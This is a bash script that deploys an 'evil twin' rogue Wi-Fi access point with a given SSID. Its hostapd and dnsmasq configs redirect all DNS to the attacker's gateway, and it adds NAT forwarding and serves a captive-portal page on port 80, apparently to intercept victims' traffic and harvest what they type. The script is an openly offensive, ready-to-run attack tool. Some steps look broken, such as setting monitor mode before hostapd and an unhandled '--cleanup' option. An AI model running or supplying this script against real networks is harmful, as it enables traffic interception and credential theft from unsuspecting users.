#!/bin/bash
# deploy_evil_twin.sh — Deploy evil twin AP with captive portal
# Usage: bash deploy_evil_twin.sh <wlan_iface> <ssid> <internet_iface>

set -euo pipefail

WLAN="${1:?Usage: $0 <wlan_iface> <ssid> <internet_iface>}"
SSID="${2:?Usage: $0 <wlan_iface> <ssid> <internet_iface>}"
INET="${3:?Usage: $0 <wlan_iface> <ssid> <internet_iface>}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
GATEWAY="10.0.0.1"
SUBNET="10.0.0.0/24"
DHCP_RANGE="10.0.0.100,10.0.0.200"

echo "[*] Killing interfering processes..."
airmon-ng check kill 2>/dev/null || true
killall dnsmasq hostapd 2>/dev/null || true

echo "[*] Starting monitor mode on $WLAN..."
ip link set "$WLAN" down
iw dev "$WLAN" set type monitor
ip link set "$WLAN" up

echo "[*] Configuring interface..."
ip addr add $GATEWAY/24 dev "$WLAN" 2>/dev/null || true
ip link set "$WLAN" up

echo "[*] Creating hostapd config..."
cat > /tmp/evil_twin_hostapd.conf << EOF
interface=$WLAN
driver=nl80211
ssid=$SSID
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=0
EOF

echo "[*] Creating dnsmasq config..."
cat > /tmp/evil_twin_dnsmasq.conf << EOF
interface=$WLAN
dhcp-range=$DHCP_RANGE
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
no-resolv
address=/#/$GATEWAY
EOF

echo "[*] Enabling IP forwarding and NAT..."
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -o "$INET" -j MASQUERADE
iptables -A FORWARD -i "$WLAN" -o "$INET" -j ACCEPT
iptables -A FORWARD -i "$INET" -o "$WLAN" -m state --state RELATED,ESTABLISHED -j ACCEPT

echo "[*] Starting services..."
dnsmasq -C /tmp/evil_twin_dnsmasq.conf
hostapd /tmp/evil_twin_hostapd.conf -B

echo "[*] Starting captive portal server on port 80..."
python3 -m http.server 80 --directory "$SCRIPT_DIR" &
PORTAL_PID=$!
echo "[*] Portal PID: $PORTAL_PID"

echo ""
echo "=========================================="
echo " Evil Twin Active: $SSID"
echo " Gateway: $GATEWAY"
echo " DHCP range: $DHCP_RANGE"
echo " Captive portal: http://$GATEWAY"
echo " Stop: kill $PORTAL_PID && bash $0 --cleanup"
echo "=========================================="

# Cleanup handler
cleanup() {
    echo "[*] Cleaning up..."
    kill $PORTAL_PID 2>/dev/null || true
    killall dnsmasq hostapd 2>/dev/null || true
    iptables -t nat -D POSTROUTING -o "$INET" -j MASQUERADE 2>/dev/null || true
    iptables -D FORWARD -i "$WLAN" -o "$INET" -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -i "$INET" -o "$WLAN" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
    rm -f /tmp/evil_twin_*.conf
    echo "[✓] Cleanup complete"
}

trap cleanup EXIT
wait $PORTAL_PID
